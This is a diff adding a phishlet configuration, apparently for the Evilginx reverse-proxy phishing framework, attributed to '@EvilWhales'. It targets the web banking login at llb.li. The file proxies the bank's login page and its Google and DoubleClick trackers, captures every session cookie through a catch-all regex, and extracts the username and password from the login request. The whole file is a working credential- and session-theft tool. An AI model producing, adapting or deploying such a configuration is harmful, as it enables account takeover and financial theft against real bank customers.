@@ -1,0 +1,45 @@
+
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'llb.li', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'llb', orig_sub: 'llb', domain: 'piwik.pro', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wwws', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ad', orig_sub: 'ad', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wwwa', orig_sub: 'www', domain: 'googleadservices.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'googleads.g', orig_sub: 'googleads.g', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'llb.li', orig_sub: '', domain: 'llb.li', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'llb.li', orig_sub: 'llb', domain: 'piwik.pro', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'llb.li', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'llb.li', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'llb.li', orig_sub: 'ad', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'llb.li', orig_sub: 'www', domain: 'googleadservices.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'llb.li', orig_sub: 'googleads.g', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.llb.li'
+    keys: ['.*,regexp']
+  - domain: 'llb.li'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/weblogin/authentication/*'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'json'
+
+login:
+  domain: 'llb.li'
+  path: '/weblogin/authentication/login?lang=en'
+
